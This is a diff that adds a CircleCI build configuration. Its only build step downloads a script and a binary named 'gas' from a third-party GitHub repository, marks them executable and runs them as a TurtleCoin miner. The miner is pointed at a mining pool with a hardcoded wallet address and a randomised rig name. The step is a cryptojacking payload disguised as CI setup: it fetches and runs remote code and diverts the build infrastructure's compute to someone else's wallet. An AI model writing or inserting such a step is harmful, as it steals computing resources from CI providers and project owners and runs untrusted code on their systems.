@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo argon2/chukwav2 -coin Trtl -wallet TRTLuz3CqRE9EGMBoT5EgB9u2ps35M8yNHTTAwpzz2n39uDpfrUc26g9Ztoig7YtsF9GAFDt3pQND96TVjb2RQ7HAQN3CCb3AgBjojmHXtQb6Y4bW3WdRLPn7az5qrzes3NH2ZsJo1KuHX9JL6D2Qgm8Kf5DqMRMhW8uhi6ozNiWB4YpH94SwRG2JFg  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 us.turtlecoin.herominers.com:1160
